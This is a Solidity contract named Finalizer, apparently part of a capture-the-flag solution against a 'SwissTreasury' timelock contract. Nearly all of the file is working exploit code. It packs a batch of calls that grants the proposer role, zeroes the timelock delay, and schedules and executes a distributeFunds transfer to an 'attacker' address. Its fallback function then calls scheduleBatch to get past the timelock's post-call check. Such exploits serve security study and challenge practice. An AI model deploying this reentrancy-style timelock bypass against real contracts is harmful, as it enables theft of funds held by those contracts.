// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SwissTreasury.sol";

contract Finalizer {
    SwissTreasury private instance;
    address[] private targets = new address[](7);
    uint256[] private values = new uint256[](7);
    bytes[] private datas = new bytes[](7);

    constructor(address payable _instance, address attacker) {
        //COPIED ALL THE VALUES FROM EXPLOIT CONTRACT IN ORDER TO HAVE THE SAME AND
        //BE ABLE TO CALL THE SCHEDULEBATCH FUNCTIONS IN ORDER TO PASS THE _aftercall(id) FUNCTION

        instance = SwissTreasury(_instance);

        targets[0] = _instance;
        targets[1] = _instance;
        targets[2] = _instance;
        targets[3] = _instance;
        targets[4] = _instance;
        targets[5] = _instance;
        targets[6] = address(this);

        datas[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            _instance
        );

        datas[1] = abi.encodeWithSignature("updateDelay(uint256)", 0);

        datas[2] = abi.encodeWithSignature(
            "schedule(address,uint256,bytes,bytes32,bytes32,uint256)",
            _instance,
            0,
            abi.encodeWithSignature(
                "distributeFunds(address,uint256)",
                attacker,
                10000000 gwei
            ),
            0,
            0,
            0
        );

        datas[3] = abi.encodeWithSignature(
            "execute(address,uint256,bytes,bytes32,bytes32)",
            _instance,
            0,
            abi.encodeWithSignature(
                "distributeFunds(address,uint256)",
                attacker,
                10000000 gwei
            ),
            0,
            0
        );

        datas[5] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        datas[6] = abi.encodeWithSignature("randomFunction()");
    }

    fallback() external {
        //last step scheduleBatch in order to pass
        //Timelock _afterCall function
        instance.scheduleBatch(targets, values, datas, 0, 0, 0);
    }
}
